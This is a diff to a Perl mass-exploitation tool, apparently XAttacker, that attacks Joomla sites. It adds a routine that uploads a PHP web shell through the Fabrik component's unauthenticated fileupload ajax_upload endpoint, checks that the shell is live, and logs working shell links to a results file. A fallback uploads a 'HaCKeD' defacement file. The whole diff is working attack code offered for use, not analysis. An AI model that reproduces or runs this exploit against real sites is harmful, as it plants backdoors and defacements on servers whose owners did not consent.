@@ -157,6 +157,7 @@ print color('bold white'),"\n[$a] $site - ";
   comedia();
   comjdownloads();
   comfabrik();
+  comfabrik2();
   foxcontact();
   comadsmanager();
   comblog();
@@ -2944,8 +2945,8 @@ print color('bold red'),"] ";
 print color('bold white'),"Com Jdownloads";
 print color('bold white')," .................... ";
 print color('bold red'),"NOt VULN\n";
+comjdownloadsdef();
 }
-
 }
 
 
@@ -3032,7 +3033,6 @@ print color('bold red'),"] ";
 print color('bold white'),"Com Fabrik";
 print color('bold white')," ........................ ";
 print color('bold red'),"NOt VULN\n";
-  comjdownloadsdef();
 }
 }
 
@@ -3076,7 +3076,86 @@ print color('bold white')," .................. ";
 print color('bold red'),"NOt VULN\n";
 }
 }
+################ comfabrik2 #####################
+sub comfabrik2(){
+my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
+my $shell ="XAttacker.php";
 
+my $response = $ua->post( $url,
+            Content_Type => 'form-data',
+            Content => ["file" => ["$shell"]]
+           
+            );
+
+$comfabrikupp2="$site/XAttacker.php?X=Attacker";
+
+$checkcomfabrikupp = $ua->get("$comfabrikupp2")->content;
+if($checkcomfabrikupp =~/X Attacker/) {
+
+print color('bold red'),"[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Com Fabrik2";
+print color('bold white')," ........................ ";
+print color('bold green'),"VULN\n";
+print color('bold green')," [";
+print color('bold red'),"+";
+print color('bold green'),"] ";
+print color('bold white'),"Shell Uploaded Successfully\n";
+print color('bold white'),"  [Link] => $comfabrikupp2\n";
+open (TEXT, '>>Result/shells.txt');
+print TEXT "$comfabrikupp\n";
+close (TEXT);
+}else{
+print color('bold red'),"[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Com Fabrik2";
+print color('bold white')," ........................ ";
+print color('bold red'),"NOt VULN\n";
+comfabrikdef2();
+}
+}
+
+################ comfabrik index2 #####################
+sub comfabrikdef2(){
+my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
+my $index ="XAttacker.txt";
+
+my $response = $ua->post( $url,
+            Content_Type => 'form-data',
+            Content => ["file" => ["$index"]]
+           
+            );
+
+$comfabrikup2="$site/XAttacker.txt";
+
+$checkcomfabrikup = $ua->get("$comfabrikup2")->content;
+if($checkcomfabrikup =~/HaCKeD/) {
+
+print color('bold red'),"[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Com Fabrik Index2";
+print color('bold white')," .................. ";
+print color('bold green'),"VULN\n";
+print color('bold green')," [";
+print color('bold red'),"+";
+print color('bold green'),"] ";
+print color('bold white'),"File Uploaded Successfully\n";
+print color('bold white'),"  [Link] => $comfabrikup2\n";
+open (TEXT, '>>Result/index.txt');
+print TEXT "$comfabrikup2\n";
+close (TEXT);
+}else{
+print color('bold red'),"[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Com Fabrik2 Index";
+print color('bold white')," .................. ";
+print color('bold red'),"NOt VULN\n";
+}
+}
 ################ foxcontact #####################
 sub foxcontact(){
 
